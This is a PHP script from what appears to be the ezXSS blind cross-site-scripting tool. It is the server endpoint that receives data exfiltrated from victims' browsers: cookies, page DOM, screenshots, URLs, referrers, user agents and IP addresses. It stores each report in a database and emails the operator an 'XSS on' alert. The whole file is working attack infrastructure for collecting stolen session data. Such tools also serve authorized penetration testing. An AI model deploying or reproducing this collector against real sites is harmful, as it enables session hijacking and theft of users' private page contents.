<?php

  error_reporting(0);
  echo "github.com/ssl/ezXSS";

  if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    die();
  }

  //> Decode the JSON from the post
  $json = file_get_contents('php://input');
  $jsonDecoded = json_decode($json, true);

  //> Information about user and domain
  $userIP = $_SERVER["REMOTE_ADDR"];
  $userIP2 = htmlspecialchars((isset($_SERVER["HTTP_X_FORWARDED_FOR"])) ? ", " . ($_SERVER["HTTP_X_FORWARDED_FOR"]) : "");
  $domain = htmlspecialchars($_SERVER['SERVER_NAME']);

  //> Require Database for query and
  require_once __DIR__ . "/manage/src/Database.php";
  $database = new Database();

  //> Insert into DB
  $id = $database->lastInsertId("INSERT INTO reports (`cookies`, `dom`, `origin`, `referer`, `screenshot`, `uri`, `user-agent`, `ip`, `time`) VALUES (:cookies, :dom, :origin, :referer, :screenshot, :uri, :userAgent, :ip, :time)",
  array(":cookies" => $jsonDecoded["cookies"], ":dom" => $jsonDecoded["dom"], ":origin" => $jsonDecoded["origin"],":referer" => $jsonDecoded["referrer"], ":screenshot" => $jsonDecoded["screenshot"], ":uri" => $jsonDecoded["uri"], ":userAgent" => $jsonDecoded["user-agent"],":ip" => $userIP . $userIP2, ":time" => time()));

  //> Alert email
  $email = $database->newQueryArray("SELECT * FROM settings WHERE setting='email' LIMIT 1");

  //> Send email
  $htmlTemplate = str_replace(
    ["{{id}}", "{{domain}}", "{{url}}", "{{ip}}", "{{referer}}", "{{user-agent}}", "{{cookies}}", "{{dom}}", "{{origin}}", "{{time}}"],
    [$id, $domain, htmlspecialchars($jsonDecoded["uri"]), $userIP.$userIP2, htmlspecialchars($jsonDecoded["referer"]), htmlspecialchars($jsonDecoded["user-agent"]), htmlspecialchars($jsonDecoded["cookies"]), htmlspecialchars($jsonDecoded["dom"]), htmlspecialchars($jsonDecoded["origin"]), time()],
    file_get_contents("manage/src/templates/site/mail.htm")
  );

  $headers[] = 'MIME-Version: 1.0';
  $headers[] = 'Content-type: text/html; charset=iso-8859-1';

  mail($email["value"], "[ezXSS] XSS on " . htmlspecialchars($jsonDecoded["uri"]), $htmlTemplate, implode("\r\n", $headers));